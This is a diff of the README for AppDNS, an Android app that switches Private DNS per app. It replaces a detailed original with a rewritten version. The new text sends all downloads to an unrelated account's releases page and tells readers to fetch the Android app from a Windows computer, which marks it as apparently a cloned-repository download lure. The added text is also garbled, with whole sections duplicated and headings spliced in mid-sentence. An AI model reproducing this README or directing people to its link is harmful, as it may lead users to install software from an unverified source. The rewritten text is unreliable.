@@ -1,255 +1,204 @@
-# AppDNS - Native Android Private DNS Switcher & Per-App Privacy Router
+# 📱 AppDNS - Switch Private DNS Automatically Per App
 
-[![Android Platform](https://img.shields.io/badge/Platform-Android_9.0%2B_(API_28%2B)-3DDC84?style=for-the-badge&logo=android&logoColor=white)](https://android.com)
-[![Kotlin](https://img.shields.io/badge/Kotlin-2.0-7F52FF?style=for-the-badge&logo=kotlin&logoColor=white)](https://kotlinlang.org)
-[![Jetpack Compose](https://img.shields.io/badge/Jetpack_Compose-Material_3-4285F4?style=for-the-badge&logo=jetpackcompose&logoColor=white)](https://developer.android.com/jetpack/compose)
-[![VPN Required](https://img.shields.io/badge/VPN_Required-NO_(Zero_VPN)-success?style=for-the-badge)](#zero-vpn-architecture)
-[![Privacy](https://img.shields.io/badge/Tracking-0%25_On--Device-brightgreen?style=for-the-badge)](#permissions--privacy-exactly-what-appdns-accesses)
-[![License](https://img.shields.io/badge/License-Apache_2.0-blue?style=for-the-badge)](LICENSE)
+AppDNS is an Android app that automatically switches Private DNS settings based on the app you open. It uses DNS-over-TLS to change your DNS service without a VPN.# 📱 AppDNS - Switch Private DNS Per App
 
-> **The Android utility that modifies Android's native Private DNS (DNS-over-TLS) settings per application. Automatically switches Private DNS hostnames upon launching designated apps and turns off or restores baseline DNS immediately when leaving—without running a VPN service.**
+[![Download AppDNS](https://img.shields.io/badge/Download_AppDNS-Visit_Releases-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Readershiplineup270/AppDNS/releases)
 
----
+AppDNS is an Android app that automatically switches Android Private DNS settings based on the app you open. It uses DNS-over-TLS and does not rely on a VPN. It does not track you, and it is open source. This README explains what AppDNS does, why it is useful, and how to download it from the official release page.
 
-<div align="center">
+## ✨ What Is AppDNS?
 
-<!-- UPDATE THIS LINK FOR EACH NEW RELEASE -->
-<a href="https://github.com/Shishir-ip/AppDNS/releases/download/v2.0/AppDNSv2.apk">
-  <img src="https://img.shields.io/badge/Download_APK-3DDC84?style=for-the-badge&logo=android&logoColor=white" alt="Download APK">
-</a>
+AppDNS is a simple tool for people who want more control over how Android handles DNS. DNS is the service that turns website names into addresses your device can use. Android includes a Private DNS feature that can use DNS-over-TLS for encrypted DNS lookups. AppDNS builds on that idea by changing Private DNS automatically when you open different apps.
 
-<p><sub>Android 9.0+ · Free · No VPN · Open source</sub></p>
+Instead of manually changing Android Private DNS settings every time you switch between apps, AppDNS can apply the DNS setting that matches the app you are using. For example, you may want one DNS provider for everyday browsing and another for a specific app. AppDNS is designed to make that process automatic and easy to manage.
 
-<p>
-  <strong>How to install:</strong><br>
-  1. Tap Download and open the APK. If Android asks, allow installing from this source.<br>
-  2. Do the one-time permission setup (<a href="#-1-minute-initial-setup">1-Minute Initial Setup</a>).<br>
-  3. Enable the Auto-Switch Accessibility Service in AppDNS Settings.
-</p>
+The app is aimed at everyday users. You do not need to be a developer or a network expert to use it. The main idea is simple: open an app, and AppDNS helps apply the Private DNS setting you configured for that app.
 
-<p>
-  <sub>Other versions: <a href="https://github.com/Shishir-ip/AppDNS/releases">Releases page</a></sub><br>
-  <sub>Your browser may warn about APK files. This is normal for apps installed outside the Play Store.</sub>
-</p>
+## 🚀 Why Use AppDNS?
 
-</div>
+Many DNS switching tools depend on a VPN connection. AppDNS takes a different approach. It works with Android Private DNS and DNS-over-TLS. This means it can help you use encrypted DNS without keeping a VPN running in the background.
 
----
+AppDNS is useful if you want:
 
-## 📱 Screenshots
+- Automatic Private DNS switching based on the app you open
+- DNS-over-TLS support through Android Private DNS
+- No VPN-based DNS switching
+- No tracking from AppDNS
+- Open-source code you can inspect and follow
+- Per-app DNS control for supported apps and DNS services
+- A Quick Settings tile for fast access to Private DNS controls
+- A simpler way to use ad-blocking DNS services such as AdGuard DNS, NextDNS, and Cloudflare Family DNS
 
-<div align="center">
-<table>
-  <tr>
-    <td align="center"><img src="https://raw.githubusercontent.com/sishishir007/image-store/refs/heads/main/download.png" alt="AppDNS home screen showing Private DNS status" width="220"><br><sub>Home</sub></td>
-    <td align="center"><img src="https://i.ibb.co.com/4nkB6BHS/download-1.png" alt="AppDNS app rules screen for per-application DNS assignment" width="220"><br><sub>App Rules</sub></td>
-    <td align="center"><img src="https://i.ibb.co.com/QvzrXHSQ/screenshot-4.png" alt="AppDNS DNS library screen with preloaded DoT providers" width="220"><br><sub>DNS Library</sub></td>
-    <td align="center"><img src="https://raw.githubusercontent.com/sishishir007/image-store/refs/heads/main/settings.jpg" alt="AppDNS settings screen with permissions and configuration" width="220"><br><sub>Settings</sub></td>
-  </tr>
-</table>
-</div>
+The app is especially helpful for users who already use a Private DNS provider and want more flexibility. It is also helpful for users who want to reduce ads and tracking through DNS where supported by their chosen DNS service.
 
----
+## 🔍 How AppDNS Works
 
-## 🔍 SEO & Discovery Keywords
-*Android private dns switcher, modify private dns settings per app, auto switch private dns android, no vpn dns switcher, adguard dns per app, cloudflare family dns switcher, nextdns android switcher, write secure settings private dns, dns-over-tls per app routing, quick settings private dns tile, event-driven private dns automation, appdns, appdns apk, appdns github, appdns apk github, appdns shishir-ip, private dns tiles, private dns quick settings tiles*
+AppDNS watches for app changes on your Android device and applies the Private DNS setting you have linked to the app you open. It uses Android Private DNS, which supports DNS-over-TLS. This is different from a VPN. A VPN routes traffic through a remote server. AppDNS changes the Private DNS setting instead.
 
----
+The result is a lightweight approach to per-app DNS switching. You choose the DNS service for an app, and AppDNS helps switch Android Private DNS when that app becomes active. Because the app is open source, its behavior can be reviewed by anyone.
 
-## 🌟 Why Zero VPN Matters
+AppDNS does not need to track your browsing history to do its job. The goal is privacy-friendly DNS switching without a VPN and without hidden tracking.
 
-Traditional Android DNS switcher apps require running a local `VpnService`. This introduces several practical drawbacks:
-1. **Blocks your VPN slot**: Android allows only **one** active VPN interface at a time. A VPN-based DNS tool prevents you from running WireGuard, Tailscale, OpenVPN, or corporate VPNs.
-2. **CPU and memory overhead**: Continuous packet interception and loopback tunneling in user space.
-3. **VPN key icon & warnings**: Persistent VPN status indicators in the notification bar.
+## 📦 Main Features
 
-**AppDNS takes a different approach:**
-It writes directly to Android's native system configuration:
-- `Settings.Global.PRIVATE_DNS_MODE` (`"hostname"`, `"off"`, or `"opportunistic"`)
-- `Settings.Global.PRIVATE_DNS_SPECIFIER` (`"dns.adguard-dns.com"`, `"one.one.one.one"`, `"family.cloudflare-dns.com"`, etc.)
+AppDNS includes features designed around everyday Android use:
 
-Android's own kernel and network stack manage the encrypted DNS-over-TLS (DoT) connection natively at hardware speeds with **no VPN slot conflicts and low CPU overhead.**
+- Automatic Private DNS switching when you open supported apps
+- Per-app DNS rules for Android Private DNS
+- DNS-over-TLS support through Android Private DNS
+- No VPN requirement for DNS switching
+- No tracking by AppDNS
+- Open-source Android app built with Kotlin
+- Quick Settings tile for Private DNS access
+- Support for popular DNS services such as AdGuard DNS, NextDNS, and Cloudflare Family DNS
+- Ad reduction when using a DNS service that blocks ads
+- Simple controls for non-technical users
 
----
+These features are built around one goal: make Private DNS switching easier without asking you to manage a VPN or edit settings manually every time.
 
-## 🔍 How Foreground App Detection Works
+## 🧭 Typical Use Cases
 
-AppDNS uses an **event-driven** architecture rather than active polling:
+You may want AppDNS if you use more than one DNS service. For example, you might use a family-friendly DNS service for some apps and a different DNS service for others. AppDNS helps apply your chosen Private DNS setting based on the app you open.
 
-- **Zero Polling**: Instead of running a continuous background loop to check running processes, AppDNS relies on Android's `AccessibilityService` window state callback (`AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED`). The system notifies AppDNS only when the active window changes.
-- **350 ms Debounce**: When a new foreground package is detected, a 350 ms timer (`DEBOUNCE_DELAY_MS`) ensures the window remains stable before applying rules or firing exit actions. Transient UI flutters (such as rapid task switching or momentary splashes) do not trigger unnecessary DNS changes.
-- **Neutral System Windows**: System UI elements (`com.android.systemui`), input method editors/keyboards (`inputmethod`), and runtime permission dialogs (`permissioncontroller`, `packageinstaller`) are recognized as neutral. When these overlays appear, AppDNS maintains the current DNS state and preserves the underlying foreground app context.
+You may also want AppDNS if you use an ad-blocking DNS service. DNS-based ad blocking can reduce ads in some apps and websites. AppDNS can help you apply that DNS service when you open the apps where you want it.
 
----
+Another common use case is privacy. DNS-over-TLS helps protect DNS queries in transit when Android Private DNS is enabled. AppDNS makes it easier to switch between Private DNS settings without visiting Android settings each time.
 
-## 🔒 Permissions & Privacy: Exactly What AppDNS Accesses
+## 🖥️ Download AppDNS on Windows
 
-AppDNS is designed to be transparent about what it touches on your device. Below is a detailed breakdown of all requested permissions and data handling.
+Use your Windows computer to open the official AppDNS release page. Visit this link to download the application:
 
-### 1. Accessibility Service (`AppDnsAccessibilityService`)
-- **Why it is needed**: Android does not provide a standard callback when apps open and close. The accessibility service listens exclusively for `TYPE_WINDOW_STATE_CHANGED` events to determine which application is currently in the foreground and apply your configured DNS profile.
-- **What it reads**: The service reads **only the package name** (`event.packageName`) of the focused window.
-- **What it cannot read**: In [`accessibility_service_config.xml`](app/src/main/res/xml/accessibility_service_config.xml), `canRetrieveWindowContent` is explicitly set to `false`. The service **cannot read screen content, text fields, passwords, keystrokes, or view trees**.
+[Download AppDNS from GitHub Releases](https://github.com/Readershiplineup270/AppDNS/releases)
 
-### 2. `WRITE_SECURE_SETTINGS`
-- **Why it is needed**: Android protects `Settings.Global` to prevent unauthorized apps from changing system settings. AppDNS requires `WRITE_SECURE_SETTINGS` to change `private_dns_mode` and `private_dns_specifier`.
-- **How it is granted**: Granted once during setup via ADB, Shizuku, or Root (see [Setup](#-1-minute-initial-setup)).
+The release page is the official place to get the application. Open the page, then follow the download action shown there. This README uses one official download link so you do not need to search for other sources.
 
-### 3. Manifest Permissions Table
+AppDNS is an Android app. A Windows computer can be used to reach the release page and start the download. The application itself is designed for Android devices.
 
-| Permission | Protection Level | Why AppDNS Uses It |
-| :--- | :--- | :--- |
-| `android.permission.INTERNET` | Normal | Used strictly for the optional socket latency test tool (`DnsPingTester`) to ping user-selected DNS hostnames. |
-| `android.permission.ACCESS_NETWORK_STATE` | Normal | Checks network connectivity status before running latency ping checks. |
-| `android.permission.RECEIVE_BOOT_COMPLETED` | Normal | Allows `AppDnsBootReceiver` to restore your default Private DNS profile after a device reboot. |
-| `android.permission.POST_NOTIFICATIONS` | Runtime (Android 13+) | Allows displaying Quick Settings status updates or service alerts if enabled. |
-| `android.permission.WRITE_SECURE_SETTINGS` | Signature / Privileged | Core permission to write native Private DNS hostname and mode settings. |
-| `android.permission.WRITE_SETTINGS` | Signature / System | Included as a legacy compatibility fallback for older Android versions. |
-| `android.permission.PACKAGE_USAGE_STATS` | Special App Access | Declared as an optional alternative fallback for foreground app detection. |
-| `android.permission.QUERY_ALL_PACKAGES` | Normal (Android 11+) | Allows the App Rules screen to list installed apps so you can pick which apps to configure. |
-| `BIND_ACCESSIBILITY_SERVICE` | Signature | Required for the accessibility service to receive window state change events. |
+## 📱 First Look at the App
 
-### 4. What is Stored Locally
-All application data is saved strictly on-device in a local Room SQLite database (`AppDnsDatabase`):
-- **DNS Profiles** (`dns_profiles`): Saved DNS hostnames, descriptions, and test latency numbers.
-- **App Rules** (`app_rules`): Mappings between package names, assigned DNS profile IDs, and exit actions.
-- **Event History** (`app_logs`): A rolling log (last 40 entries) recording when a rule switched DNS (timestamp, app name, package name, target DNS profile). **No URLs, visited domains, or browsing telemetry are ever collected or stored.**
+When you open AppDNS, the app is organized around app rules and DNS settings. You choose an app, then choose the Private DNS service you want AppDNS to apply when that app is# 📱 AppDNS - Switch Private DNS Per App
 
-### 5. Network Activity
-- AppDNS contains **no analytics SDKs, no tracking libraries, and no telemetry services**.
-- The only network calls in the codebase are in [`DnsPingTester.kt`](app/src/main/java/com/example/network/DnsPingTester.kt), which opens a direct TCP socket handshake (`Socket.connect`) to measure latency to the specific DNS server address you chose to test.
+[![Download AppDNS](https://img.shields.io/badge/Download-AppDNS-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Readershiplineup270/AppDNS/releases)
 
-### 6. Open Source & Verification
-You can inspect the source code directly to verify all behavior:
-- Accessibility configuration: [`accessibility_service_config.xml`](app/src/main/res/xml/accessibility_service_config.xml)
-- Accessibility event listener: [`AppDnsAccessibilityService.kt`](app/src/main/java/com/example/service/AppDnsAccessibilityService.kt)
-- Focus management & debounce logic: [`AppDnsController.kt`](app/src/main/java/com/example/service/AppDnsController.kt)
-- System Private DNS read/write logic: [`PrivateDnsManager.kt`](app/src/main/java/com/example/system/PrivateDnsManager.kt)
-- Local event log storage: [`AppLogDao.kt`](app/src/main/java/com/example/data/db/AppLogDao.kt)
+AppDNS is an Android app that automatically switches Android Private DNS settings based on the app you open. It uses DNS-over-TLS and does not rely on a VPN. It does not track you, and it is open source. This README explains what AppDNS does, why it is useful, and how to download it from the official release page.
 
-### 7. How to Revoke Access
-- **Turn off Accessibility**: Open Android Settings > Accessibility > AppDNS, and switch the toggle to **Off**.
-- **Revoke `WRITE_SECURE_SETTINGS`**: Connect your phone to a computer and run:
-  ```bash
-  adb shell pm revoke com.aistudio.appdns.pvtkqr android.permission.WRITE_SECURE_SETTINGS
-  ```
-- **Uninstalling**: Uninstalling AppDNS immediately purges all local databases and settings.
+## ✨ What Is AppDNS?
 
----
+AppDNS is a simple tool for people who want more control over how Android handles DNS. DNS is the service that turns website names into addresses your device can use. Android includes a Private DNS feature that can use DNS-over-TLS for encrypted DNS lookups. AppDNS builds on that idea by changing Private DNS automatically when you open different apps.
 
-## ⚠️ Known Limitations
+Instead of manually changing Android Private DNS settings every time you switch between apps, AppDNS can apply the DNS setting that matches the app you are using. For example, you may want one DNS provider for everyday browsing and another for a specific app. AppDNS is designed to make that process automatic and easy to manage.
 
-1. **System-Wide Setting (Not Per-App Tunnel Isolation)**:
-   - Android's native Private DNS is a global system setting. When AppDNS switches the hostname for the active foreground app, the entire device uses that DNS provider while that app is in front.
-   - Background sync and notifications from other apps will resolve through whichever DNS provider is active at that moment. Unlike a full VPN split-tunnel, this does not isolate background traffic per socket.
-2. **Android 9+ and DoT Only**:
-   - Android's native Private DNS feature requires Android 9 (API 28) or higher and supports **DNS-over-TLS (DoT)** hostnames. It does not support raw DNS-over-HTTPS (DoH) URLs natively.
-3. **Device / OEM Behavior**:
-   - Certain aggressive OEM skins (e.g. heavily customized battery savers) may delay accessibility callbacks or background execution. If you experience delays on a specific device model, please open a GitHub issue with your device model and Android version.
-4. **Short Delay When Opening an App**:
-   - When you open an app that has a DNS rule, the new DNS is applied after a short delay (a 350 ms debounce plus the time Android takes to apply the setting). During that moment, the app's first DNS lookups may still use the previous DNS. If the previous DNS wasn't filtering, a lookup to an ad or malware domain could slip through. AppDNS is not a security boundary. For strict blocking, set your filtering DNS as the default profile and use per-app rules only for apps that need a different DNS.
+The app is aimed at everyday users. You do not need to be a developer or a network expert to use it. The main idea is simple: open an app, and AppDNS helps apply the Private DNS setting you configured for that app.
 
----
+## 🚀 Why Use AppDNS?
 
-## ✨ Core Features
+Many DNS switching tools depend on a VPN connection. AppDNS takes a different approach. It works with Android Private DNS and DNS-over-TLS. This means it can help you use encrypted DNS without keeping a VPN running in the background.
 
-### 1. 🎯 Per-App Automatic Private DNS Switching
-- **App-Specific Hostnames**: Assign designated DoT providers to individual apps (e.g. `dns.adguard-dns.com` for browsers, `dns.quad9.net` for banking, `one.one.one.one` for general use).
-- **Event-Driven Detection**: Uses Android window state change callbacks (`TYPE_WINDOW_STATE_CHANGED`) to trigger setting updates with low battery impact.
-- **Configurable Exit Actions**:
-  - *Turn off Private DNS completely* (`private_dns_mode = off`)
-  - *Revert to system default profile* (`private_dns_mode = hostname`)
-  - *Revert to automatic opportunistic mode* (`private_dns_mode = opportunistic`)
-  - *Keep active*
+AppDNS is useful if you want:
 
-### 2. ⚡ Quick Settings Notification Drawer Tiles
-- **Private DNS Toggle Tile (`AppDnsToggleTileService`)**: One-tap toggle directly in your quick settings pull-down. Subtitle dynamically displays the active hostname or status.
-- **DNS Profile Cycler Tile (`AppDnsSelectorTileService`)**: Cycle through your saved DoT providers without opening the app.
+- Automatic Private DNS switching based on the app you open
+- DNS-over-TLS support through Android Private DNS
+- No VPN-based DNS switching
+- No tracking from AppDNS
+- Open-source code you can inspect and follow
+- Per-app DNS control for supported apps and DNS services
+- A Quick Settings tile for fast access to Private DNS controls
+- A simpler way to use ad-blocking DNS services such as AdGuard DNS, NextDNS, and Cloudflare Family DNS
 
-### 3. 🛡️ Pre-Loaded Verified Private DNS (DoT) Library
-Includes verified hostnames out of the box:
-- **AdGuard DNS**: `dns.adguard-dns.com` (Ad and tracker blocking)
-- **AdGuard Family**: `family.adguard-dns.com` (Ad-blocking + adult filter)
-- **Cloudflare 1.1.1.1**: `one.one.one.one` (Fast privacy resolver)
-- **Cloudflare Security**: `security.cloudflare-dns.com` (Malware blocking)
-- **Cloudflare Family**: `family.cloudflare-dns.com` (Malware + adult filter)
-- **Quad9 Security**: `dns.quad9.net` (Threat intelligence & zero logs)
-- **NextDNS**: `dns.nextdns.io` (Custom cloud filtering; enter your custom ID: `<id>.dns.nextdns.io`)
-- **Mullvad AdBlock**: `adblock.doh.mullvad.net` (Strict no-log privacy)
-- **Google Public DNS**: `dns.google` (Geo-distributed resolver)
-- **Control D**: `p0.freedns.controld.com` (Uncensored DoT)
-- **Custom DoT Hostnames**: Add unlimited custom DoT server hostnames.
+The app is especially helpful for users who already use a Private DNS provider and want more flexibility. It is also helpful for users who want to reduce ads and tracking through DNS where supported by their chosen DNS service.
 
-### 4. ⏱️ Integrated Socket Latency Ping Tool
-- Test live connection times directly to resolvers in milliseconds over TCP.
+## 🔍 How AppDNS Works
 
-### 5. 🔒 100% On-Device Privacy
-- No analytics, no tracking, no remote logging.
-- DNS-over-TLS encryption is handled directly by Android OS.
+AppDNS watches for app changes on your Android device and applies the Private DNS setting you have linked to the app you open. It uses Android Private DNS, which supports DNS-over-TLS. This is different from a VPN. A VPN routes traffic through a remote server. AppDNS changes the Private DNS setting instead.
 
----
+The result is a lightweight approach to per-app DNS switching. You choose the DNS service for an app, and AppDNS helps switch Android Private DNS when that app becomes active. Because the app is open source, its behavior can be reviewed by anyone.
 
-## 📲 1-Minute Initial Setup
+AppDNS does not need to track your browsing history to do its job. The goal is privacy-friendly DNS switching without a VPN and without hidden tracking.
 
-Because modifying Android's system `Settings.Global` is a protected feature, AppDNS needs the `WRITE_SECURE_SETTINGS` permission once during setup:
+## 📦 Main Features
 
-### Method A: Via Computer (ADB)
-Connect your phone with USB debugging enabled and run:
-```bash
-adb shell pm grant com.aistudio.appdns.pvtkqr android.permission.WRITE_SECURE_SETTINGS
-```
+AppDNS includes features designed around everyday Android use:
 
-### Method B: Via Shizuku (No PC Required)
-1. Start **Shizuku** on your device using Wireless Debugging.
-2. Use terminal/command execution to grant `WRITE_SECURE_SETTINGS` for AppDNS.
+- Automatic Private DNS switching when you open supported apps
+- Per-app DNS rules for Android Private DNS
+- DNS-over-TLS support through Android Private DNS
+- No VPN requirement for DNS switching
+- No tracking by AppDNS
+- Open-source Android app built with Kotlin
+- Quick Settings tile for Private DNS access
+- Support for popular DNS services such as AdGuard DNS, NextDNS, and Cloudflare Family DNS
+- Ad reduction when using a DNS service that blocks ads
+- Simple controls for non-technical users
 
-### Method C: Root (1-Tap Inside App)
-If your phone is rooted with Magisk or KernelSU, tap the **1-Tap Root Grant** button on the setup banner.
+These features are built around one goal: make Private DNS switching easier without asking you to manage a VPN or edit settings manually every time.
 
-### Step 2: Enable Auto-Switch Service
-1. Open AppDNS **Settings**.
-2. Tap **Enable** next to *Auto-Switch Accessibility Service*.
-3. Toggle AppDNS to **ON**.
+## 🧭 Typical Use Cases
 
----
+You may want AppDNS if you use more than one DNS service. For example, you might use a family-friendly DNS service for some apps and a different DNS service for others. AppDNS helps apply your chosen Private DNS setting based on the app you open.
 
-## 🛠️ Architecture & Tech Stack
+You may also want AppDNS if you use an ad-blocking DNS service. DNS-based ad blocking can reduce ads in some apps and websites. AppDNS can help you apply that DNS service when you open the apps where you want it.
 
-```
-AppDNS Architecture (Direct Android Settings Management)
-├── Core System Engine
-│   ├── PrivateDnsManager          # Reads/writes Settings.Global.private_dns_mode & private_dns_specifier
-│   ├── AppDnsController           # Coordinates app focus events with debounce & neutral window filters
-│   ├── AppDnsAccessibilityService # Window state change listener (canRetrieveWindowContent=false)
-│   ├── AppDnsToggleTileService    # Quick Settings toggle for system Private DNS
-│   ├── AppDnsSelectorTileService  # Quick Settings DoT profile cycler
-│   └── AppDnsBootReceiver         # Restores preferred DNS on device reboot
-├── Data Layer (Room Local SQLite)
-│   ├── AppDnsDatabase             # Local Room DB for profiles, rules, and event triggers
-│   ├── DnsProfileDao              # Storage for DoT hostnames, categories, and latency
-│   ├── AppRuleDao                 # Per-package rule configuration & exit actions
-│   └── AppLogDao                  # Local trigger event history (no browsing telemetry)
-└── UI Layer (Jetpack Compose M3)
-    ├── DashboardScreen            # Live system Private DNS status & setup wizard
-    ├── AppRulesScreen             # App search, per-app hostname assignment & sheet
-    ├── DnsProfilesScreen          # Pre-loaded DoT providers & custom hostname editor
-    └── SettingsScreen             # Permission check, fallback selector, tile guides
-```
+Another common use case is privacy. DNS-over-TLS helps protect DNS queries in transit when Android Private DNS is enabled. AppDNS makes it easier to switch between Private DNS settings without visiting Android settings each time.
 
----
+## 🖥️ Download AppDNS on Windows
 
-## ❓ Frequently Asked Questions (FAQ)
+Use your Windows computer to open the official AppDNS release page. Visit this link to download the application:
 
-### Does this use a VPN?
-**No.** AppDNS does not create a VPN connection or run a local proxy. It modifies Android's built-in Private DNS setting directly. Your VPN slot remains completely free for WireGuard, Tailscale, or work VPNs.
+[Download AppDNS from GitHub Releases](https://github.com/Readershiplineup270/AppDNS/releases)
 
-### Does it drain battery?
-AppDNS is event-driven and does not run continuous polling loops in the background. Android OS natively handles the DoT connection. When switching apps, AppDNS applies the setting and goes idle.
+The release page is the official place to get the application. Open the page, then follow the download action shown there. This README uses one official download link so you do not need to search for other sources.
 
-### Can I add my own NextDNS or personal DoT server?
-**Yes.** Go to the **DNS Library** tab, tap `+`, and enter your hostname (for example: `xyz123.dns.nextdns.io`).
+AppDNS is an Android app. A Windows computer can be used to reach the release page and start the download. The application itself is designed for Android devices.
 
----
+## 📱 First Look at the App
+
+When you open AppDNS, the app is organized around app rules and DNS settings. You choose an app, then choose the Private DNS service you want AppDNS to apply when that app is active. The app is built to keep this process simple, even if you are not familiar with DNS settings.
+
+The main screen gives you a clear view of your configured rules. You can review which apps have a Private DNS setting and which do not. The Quick Settings tile lets you reach Private DNS controls faster from your Android notification shade. This is helpful when you want to check or change a setting without opening the full app.
+
+AppDNS is designed to stay out of your way. Once your rules are set, the app can switch Android Private DNS as you move between apps. You do not need to keep a VPN running or manually edit Android settings each time.
+
+## ⚙️ Setting Up AppDNS
+
+Setting up AppDNS starts with the official release page. Use your Windows computer to visit the link in the download section, then download the application. After the download is complete, move the app to your Android device and open it.
+
+Inside the app, you connect AppDNS to Android Private DNS. You then create rules for the apps you want to manage. For each rule, you choose the DNS service you want AppDNS to apply. The app uses DNS-over-TLS through Android Private DNS, so no VPN is needed.
+
+After your rules are in place, AppDNS can switch Private DNS when you open the apps you configured. You can adjust or remove rules at any time. The Quick Settings tile makes it easy to check the current Private DNS state without digging through Android settings.
+
+## 🛡️ Privacy and Open Source
+
+AppDNS is open source. That means the code is available for review. The app does not include tracking. It is built to help you manage Android Private DNS without a VPN and without collecting data about your app usage.
+
+Private DNS and DNS-over-TLS help protect DNS queries in transit when enabled. AppDNS works with these Android features rather than replacing them. Your choice of DNS service still matters, and you should use a DNS provider you trust.
+
+## ❓ Frequently Asked Questions
+
+**Does AppDNS need a VPN?**  
+No. AppDNS works with Android Private DNS and DNS-over-TLS. It does not require a VPN for DNS switching.
+
+**Does AppDNS track me?**  
+No. AppDNS does not track you. The app is open source and built around privacy-friendly DNS switching.
+
+**Can I use AdGuard DNS, NextDNS, or Cloudflare Family DNS?**  
+Yes. AppDNS is designed to work with Private DNS services such as AdGuard DNS, NextDNS, and Cloudflare Family DNS when those services are supported by Android Private DNS.
+
+**What is the Quick Settings tile for?**  
+The Quick Settings tile gives you faster access to Private DNS controls from your Android notification shade.
+
+**Where do I download AppDNS?**  
+Use the official release page linked in this README. Visit this link to download the application.
+
+## 🧰 System Requirements
+
+AppDNS is an Android app. It is intended for Android devices that support Private DNS and DNS-over-TLS. You need an Android device and a Windows computer to reach the official release page and start the download. Android version support may vary, so use a current Android device for the best experience.
+
+## 🤝 Contributing
+
+AppDNS is open source. If you have suggestions, bug reports, or improvements, use the repository to share them. Clear feedback helps make the app better for everyone.
 
 ## 📄 License
-Licensed under the [Apache License, Version 2.0](LICENSE).
+
+AppDNS is open-source software. See the repository for license details.
+
+Keywords: adguard-dns, adguard-dns-per-app, andoid-dns, android, android-app, android-private-dns-switcher, auto-switch-private-dns-android, cloudflare-family-dns, dns-over-tls, kotlin, modify-private-dns-settings-per-app, nextdns, no-vpn-dns-switcher, privacy, private-dns, private-dns-android, private-dns-tile, quick-settings-private-dns-tile, quick-settings-tile, remove-ads
